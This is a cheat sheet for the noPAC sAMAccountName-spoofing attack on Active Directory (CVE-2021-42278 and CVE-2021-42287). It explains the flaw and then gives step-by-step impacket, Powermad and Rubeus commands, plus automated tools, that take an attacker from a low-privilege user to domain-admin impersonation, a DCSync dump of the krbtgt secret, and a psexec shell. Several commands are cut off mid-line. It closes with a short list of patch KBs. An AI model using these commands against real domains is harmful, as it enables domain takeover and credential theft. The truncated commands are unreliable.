# noPAC samAccountName spoofing CVE-2021-42278 and CVE-2021-42287

### During S4U2Self, the KDC will try to append a '$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller.

## Requirements:

 - MachineAccountQuota > 0

## Check for exploitation

### 1) Check the MachineAccountQuota of the account

    crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost StandIn.exe --object ms-DS-MachineAccountQuota=*

### 2) Check if the DC is vulnerable

    crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac

## Exploitation

#### 1) Create a computer account

    impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'PASS'

    powermad@windows> . .\Powermad.ps1

    powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText
 
    powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password
 
    sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer

#### 2) Clear the controlled machine account "servicePrincipalName" attribute

    impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$'

    powershell@windows> . .\Powerview.ps1

    powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain

#### 3) (CVE-2021-42278) Change the controlled machine account sAMAccountName to a Domain Controller's name without the trailing $

    impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer

#### 4) Request a TGT for the controlled machine account

    impacket@linux> getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'

    cmd@windows> Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword

#### 5) Reset the controlled machine account sAMAccountName to its old value

    impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$'

    powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer"

#### 6) (CVE-2021-42287) Request a service ticket with S4U2self by presenting the TGT obtained before

    impacket@linux> KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate

    cmd@windows> Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/

#### 7) DCSync

    KRB5CCNAME='DomainAdmin.ccache'
 
    secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local'@'DomainController.domain.local'

## Automated Exploitation

#### 1) https://github.com/cube0x0/noPac - Windows

    noPac.exe scan -domain htb.local -user user -pass 'password123'

    noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local
 
    noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local 

#### 2) https://github.com/Ridter/noPac - Linux

    python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0'

#### 3) https://github.com/safebuffer/sam-the-admin

    python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell

#### 4) https://github.com/ly4k/Pachine

    $ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'

    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate
 
    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache

    $ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'


# MITIGATIONS

### 1) KB5007247 - Windows Server 2012 R2

### 2) KB5008601 - Windows Server 2016

### 3) KB5008602 - Windows Server 2019

### 4) KB5007205 - Windows Server 2022

### 5) KB5008102

### 6) KB5008380

